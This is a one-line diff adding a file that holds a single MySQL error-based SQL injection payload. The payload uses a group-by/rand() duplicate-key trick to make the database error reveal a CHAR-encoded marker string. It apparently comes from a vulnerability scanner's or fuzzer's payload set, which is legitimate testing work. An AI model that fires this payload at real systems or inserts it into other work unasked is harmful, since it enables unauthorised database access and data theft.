@@ -1,0 +1,1 @@
+"(select 1 and row(1,1)>(select count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(100),CHAR(52),CHAR(99),CHAR(120),CHAR(97),CHAR(112),CHAR(55),CHAR(110)),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
